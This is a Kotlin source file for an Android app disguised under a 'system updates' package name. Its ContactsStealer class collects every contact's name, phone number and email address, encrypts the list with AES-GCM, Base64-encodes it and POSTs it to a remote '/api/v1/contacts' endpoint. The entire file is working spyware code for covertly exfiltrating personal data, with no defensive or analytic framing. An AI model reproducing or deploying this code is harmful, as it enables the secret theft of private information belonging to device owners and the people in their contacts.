package com.system.updates.modules.data

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.ContactsContract
import android.util.Base64
import androidx.core.content.ContextCompat
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONArray
import org.json.JSONObject
import java.security.SecureRandom

class ContactsStealer(private val context: Context) {
    private val crypto = CryptoManager(context)
    private val network = NetworkUtils(context)
    private val random = SecureRandom()

    fun collectAndExfiltrate(): Boolean {
        if (!hasContactsPermission()) return false

        val contacts = collectContacts()
        if (contacts.isEmpty()) return false

        val json = JSONArray()
        contacts.forEach { json.put(it) }
        val plain = json.toString()
        val key = crypto.deriveDeviceKey()
        val iv = ByteArray(12).also(random::nextBytes)
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, javax.crypto.spec.SecretKeySpec(key, "AES"), javax.crypto.spec.GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(plain.toByteArray())
        val payload = iv + encrypted
        val b64 = Base64.encodeToString(payload, Base64.NO_WRAP)
        val response = network.httpPost(network.getBaseUrl() + "/api/v1/contacts", "data=$b64")
        return response.contains("success")
    }

    private fun hasContactsPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun collectContacts(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        val resolver = context.contentResolver

        val phoneCursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            ),
            null, null, null
        )
        phoneCursor?.use { cursor ->
            val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
            val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idIdx)
                val name = cursor.getString(nameIdx) ?: ""
                val number = cursor.getString(numIdx) ?: ""
                val contact = JSONObject().apply {
                    put("id", id)
                    put("name", name)
                    put("number", number)
                    put("emails", JSONArray())
                }
                list.add(contact)
            }
        }

        val emailCursor = resolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                ContactsContract.CommonDataKinds.Email.ADDRESS
            ),
            null, null, null
        )
        emailCursor?.use { cursor ->
            val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
            val emailIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idIdx)
                val email = cursor.getString(emailIdx) ?: ""
                list.find { it.getLong("id") == id }?.getJSONArray("emails")?.put(email)
            }
        }

        return list
    }
}